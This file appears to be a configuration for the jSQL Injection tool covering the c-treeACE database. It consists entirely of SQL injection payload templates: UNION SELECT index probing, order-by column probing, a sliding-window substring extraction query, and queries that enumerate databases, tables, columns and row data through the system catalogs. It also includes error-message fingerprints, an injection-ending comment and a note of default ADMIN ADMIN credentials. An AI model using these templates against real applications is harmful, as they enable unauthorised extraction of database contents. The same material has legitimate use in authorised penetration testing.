vendor: C-treeACE
# c-treeACE-Express.windows.64bit.v11.5.1.64705.190310.ACE.msi
# jdbc:ctree://localhost:6597/ctreeSQL
# ADMIN ADMIN

resource:
 info: |
   'c-treeACE_version'
   || '${enclose_value_sql}'
   || 'c-treeACE_database'
   || '${enclose_value_sql}'
   || USER_NAME()
   || '${trail_sql}'

 schema:
  database: |
   select
       ${limit}
       '${enclose_value_sql}'
       || 'default'
       || '${separator_qte_sql}'
       || '0'
       || '${enclose_value_sql}'
       || '${trail_sql}'

  table: |
   select
       ${limit}
       r
       || '${separator_cell_sql}'
       || '${trail_sql}'
   from (
       select
           '${enclose_value_sql}'
           || tbl
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           r
       from systables
       order by r
   ) x

  column: |
   select
       ${limit}
       n
       || '${separator_cell_sql}'
       || '${trail_sql}'
   from (
       select
           '${enclose_value_sql}'
           || col
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           n
       from syscolumns c
       inner join systables t
       on c.tbl = t.tbl
       where t.tbl = '${table}'
       order by n
   ) x

  row:
   query: |
    select
        ${limit}
        r
        || '${separator_cell_sql}'
        || '${trail_sql}'
    from (
        select distinct
            '${enclose_value_sql}'
            || ${fields}
            || '${separator_qte_sql}'
            || '0'
            || '${enclose_value_sql}'
            r
        from ${table}
    ) x
   fields:
    field: trim(cast(${field.value} as char(65565)))
    concat: "||'%7f'||"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           concat(
               '${lead}',
               substr(
                   (${injection}),
                   ${window.char},
                   ${capacity}
               )
           )
   )
  limit: top 1 skip ${limit.value}
  failsafe: 1337${indice}7330%2b1
  calibrator: repeat('${calibrator_sql}', 8187)
  limitBoundary: 0
  endingComment: --+
  fingerprint:
   errorMessage:
    - c-treeACE
   orderByErrorMessage:
    - Bad field specification in order by clause

 normal:
  indices: union select ${indices}
  capacity: |
   (
       select
           '${lead}${indice}'
           || ${calibrator}
   )
  orderBy: order by 1337

